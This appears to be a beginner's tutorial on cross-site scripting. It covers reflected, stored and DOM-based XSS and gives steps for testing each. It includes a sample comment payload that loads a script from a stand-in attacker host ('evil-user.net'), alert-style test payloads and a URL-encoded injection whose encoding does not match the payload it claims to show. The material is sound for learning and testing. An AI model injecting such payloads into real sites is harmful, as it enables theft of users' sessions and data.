XSS(Cross-Site Scripting)

XSS is the type of vulnerability in which an attacker add a malicious script into the browser side script through an input field which then when executed by a diffrent user while visitng the same page can lead to exposure of data.

2 things that an attacker must look out for before performing an XSS is

1.Lookout for the location where the malicious code appears
2.How the webpage parses the input provided by the user


Supppose in a website there is a field which lets a user add a comment,then an attacker can add something like

<script src=http://evil-user.net/badcode> </script>

The wesbite does not parse this data or properly encode it,so when a user visits that particular page,then the code provided by the attacker may run on it.Depending on what the script does or how the page parses the data,lot of information could be disclosed.

Depending upon how the XSS code is executed ,the XSS is classified into 3 types.


1.Reflected XSS- when the code comes from the HTTP requests
2.Stored XSS- when the code is stored in the database
3.DOM Based XSS- when the code is exists in client-side code.(DOM(Document Object Model) architecture)



#REFLECTED CROSS SITE SCRIPTING

This type of XSS occurs when the data is parsed through the HTTP request and embeds the input into immediate response in an unsafe way.

Suppose in a site there is an input field which is then parsed through the web URL,something like this

http://vulnerable_site.com/?input=

and the input is parsed as 

<p>input= 'your input' </p>

if the data is not parsed properly in the input string,the site becomes vulnerable to the XSS attack,so the attacker can use something simple like

<script>alert(1)</script>

which will create a popup on the screen.thus specially crafted payloads can be inserted into the search field to get more information from the server.an attacker can do any of the following


    1.Perform any action within the application that the user can perform.
    2.View any information that the user is able to view.
    3.Modify any information that the user is able to modify.
    4.Initiate interactions with other application users, including malicious attacks, that will appear to riginate from the initial victim user.


++++++++++++++++++ HOW TO TEST +++++++++++++++++++

1.test every entry point in the website's HTTP request(i.e: from where you could submit an input)
2.try using alphanumeric values ( as they are easier to identify)
3.locate where those values are reflected in the webpage and check if they are being encoded.
4.try using a simple pasload as alert(document.domain) or alert(1) which can be refleted easily	
5.if it's successfull,then create alternative payloads and test the attack in browser




#STORED CROSS SITE SCRIPTING


the type of XSS occurs when a user input is taken from an untrusted source and then is included into the later HTTP request,thus executing malicious code.


Suppose there is a site which lets user to enter the comment for a post.

the HTTP request will look something like


POST /comment HTTP 1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net

so whenever a user visits the page.The following tag gets executed

<p>This post was extremely helpful</p>

Now,if the site doen't properly encode the data or do any other parsing,an attacker could include malicious code by url encoding,so

<script>alert(1)</script> becomes

comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E 

and when a user visits the page,the following tag gets executed.

<p><script>BAD STUFF</script></p>


NOTE:

Different entry point,location where the data is stored and different processing of the input data determines what kind of payload has to be used to exploit the vuln.

++++++++++++++++++ HOW TO TEST +++++++++++++++++++



1.	The first and foremost step is to identify all the entry points...
	It can be anything,from HTTP headers,to user supplied input such as comments or even out of band routes which the attacker can use to inject data into the page
	for ex:an application which displays Twitter feed might contain data which is processed by third party tweets.

2.	The next part is to determine the exit point for the data,for ex user supplied input data may show on logs
	which is only vissible to certain users.

To identify the input and exit points for a stored XSS for each and every permutation is feasible only for a few pages,but for more than that one needs to use automated tools.

One of more realistic way is to supply an user input and seeing the response of it.One can look out for the instances where the user input is shown such as comments in blog posts and all and seeing whether the input is actually stored or reflected instantly.
After the link between entry point and exit point has been established one needs to manually test the particular application process for the XSS and figure out whether the data is actually being stored and then testing out the different payloads.


#DOM BASED CROSS SITE SCRIPTING


DOM basex XSS occurs when a website takes data from an user-controlled input and passes it to a sink that supports dynamic code execution such as eval() and innerHTMl.to deploy this Vuln, the attacker needs to place the code at a source so that it is propogated to the sink and get executed

+++++++ HOW TO TEST FOR DOM XSS +++++++

the testing can be done through burpsuite XSS scanner, but manually one needs to identify the possible source and sinks 


### FOR HTML TAGS ###


TO test for DOM based XSS, an attacker can use (location.search) and then using browser developer tools one has to find out the location where the string is stored and then based on the context, the payload has to be refined further.

For ex: if the input string is shown with a double quote, you can use another pair of double quote to escape from the encoding.


### FOR JAVA SCRIPT ###

Identifying DOM based XSS for Java script is hard as comapred to HTML tags, It's not  necessarily that the JS code is shown on the browser.For each input string one must first need to find the instance of it of where it is being used
Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack. 



In princicple to execute a DOM based XSS one need to identify the path between a source and a sink, different source and sinks have different properties and behaviour which can affect the DOM based XSS.


Covering all this is not within the scope of this, to further read about it, One is suggested to read the material from sites like portswigger.
